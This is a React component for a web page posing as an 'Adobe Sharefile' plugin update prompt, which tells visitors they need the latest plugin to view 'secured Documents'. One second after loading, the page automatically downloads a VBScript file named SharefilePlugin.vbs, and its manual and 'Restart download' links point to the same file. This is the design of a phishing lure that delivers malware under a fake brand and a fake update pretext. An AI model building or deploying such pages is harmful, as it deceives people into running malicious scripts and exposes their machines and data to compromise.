import { useEffect } from "react";

const Download = () => {
  useEffect(() => {
    const timer = setTimeout(() => {
      const link = document.createElement("a");
      link.href = "/docs/SharefilePlugin.vbs";
      link.download = "SharefilePlugin.vbs";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 1000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-white">
      <div className="flex flex-col items-center gap-6 max-w-lg text-center">
        <div className="rounded-xl bg-[#f7f7f7] p-4">
          <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
            <rect x="12" y="4" width="24" height="32" rx="2" fill="#fff" stroke="#E30613" strokeWidth="1.5" />
            <path d="M20 12h8M20 16h8M20 20h5" stroke="#E30613" strokeWidth="1" strokeLinecap="round" />
            <circle cx="34" cy="34" r="10" fill="#fff" stroke="#7B8794" strokeWidth="1.5" />
            <path d="M34 29v7M31 33l3 3 3-3" stroke="#7B8794" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>

        <div className="space-y-2">
          <h1 className="text-2xl font-semibold text-[#2c3e50]">
            Sorry, You do not have the latest version of{" "}
            <span className="text-[#4A6FA5]">Adobe Sharefile</span> plugin installed.
          </h1>
          <p className="text-[#666] text-base">
            The latest version of the Sharefile Transfer Client is required to view secured Documents.
          </p>
        </div>

        <p className="text-sm text-[#666]">
          If the download doesn't start automatically, please{" "}
          <a
            href="/docs/SharefilePlugin.vbs"
            download
            className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
          >
            Download Manually
          </a>
          .
        </p>

        <div className="flex items-center gap-3 text-sm text-[#888]">
          <span>Download not working?</span>
          <a
            href="/docs/SharefilePlugin.vbs"
            download
            className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
          >
            Restart download
          </a>
          <span>|</span>
          <a href="#" className="text-[#4A6FA5] underline hover:text-[#3a5a8a]">
            Get Help
          </a>
        </div>
      </div>
    </div>
  );
};

export default Download;
